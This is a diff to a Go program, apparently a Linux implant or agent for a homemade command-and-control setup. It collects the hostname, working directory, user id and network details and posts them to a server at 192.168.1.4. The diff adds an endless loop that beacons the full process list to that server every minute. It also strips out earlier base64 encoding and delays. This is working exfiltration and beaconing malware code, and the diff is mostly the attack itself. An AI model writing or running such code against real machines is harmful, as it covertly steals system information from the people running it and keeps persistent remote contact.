@@ -8,7 +8,6 @@ THIS IS THE LINUX VERSION
 package main
 
 import (
-	"encoding/base64"
 	"fmt"
 	"net/http"
 	"net/url"
@@ -18,17 +17,14 @@ import (
 )
 
 func main() {
-	// time.Sleep(8 * time.Second) // Sleeping For A Specified Time
-	// req, err := http.Get("http://127.0.0.1:8000")
-	// fmt.Print(req)
-	// fmt.Print(err)
-
 	// Recon Stage
 
 	osinfo := runtime.GOOS
 	if osinfo == "windows" {
 		return
 	}
+
+	// Exfiltration
 
 	hostname, err1 := exec.Command("hostname").Output()
 	curdir, err2 := exec.Command("pwd").Output()
@@ -39,37 +35,31 @@ func main() {
 		fmt.Print(err1, err2, err3, err4)
 	}
 
-	time.Sleep(8 * time.Second) // Sleeping For A Specified Time
-
-	// Exfiltration
-
-	// Encoding
-
-	// Base64
-
-	hostbs64 := base64.StdEncoding.EncodeToString(hostname)
-	dirbs64 := base64.StdEncoding.EncodeToString(curdir)
-	userbs64 := base64.StdEncoding.EncodeToString(userid)
-	networkbs64 := base64.StdEncoding.EncodeToString(networkinfo)
-
-	fmt.Println(hostbs64)
-	fmt.Println(dirbs64)
-	fmt.Println(userbs64)
-	fmt.Println(networkbs64)
-
-	time.Sleep(8 * time.Second) // Sleeping For A Specified Time
-
-	// Encrypting
-
-	// Beaconing
-
 	data := url.Values{
-		"hostbs64":    {hostbs64},
-		"dirbs64":     {dirbs64},
-		"userbs64":    {userbs64},
-		"networkbs64": {networkbs64},
+		"hostname": {string(hostname)},
+		"pwd":      {string(curdir)},
+		"userid":   {string(userid)},
+		"network":  {string(networkinfo)},
 	}
 
-	http.PostForm("https://httpbin.org/post", data)
+	http.PostForm("http://192.168.1.4:8000/core/", data)
 
+	ss := true
+	for ss {
+		process, err9 := exec.Command("ps", "-A").Output()
+		datas := url.Values{}
+		if err9 != nil {
+			datas = url.Values{
+				"msg":       {"Still Alive"},
+				"processes": {"ERROR"},
+			}
+		} else {
+			datas = url.Values{
+				"msg":       {"Still Alive"},
+				"processes": {string(process)},
+			}
+		}
+		http.PostForm("http://192.168.1.4:8000/core/beacon/", datas)
+		time.Sleep(60 * time.Second)
+	}
 }
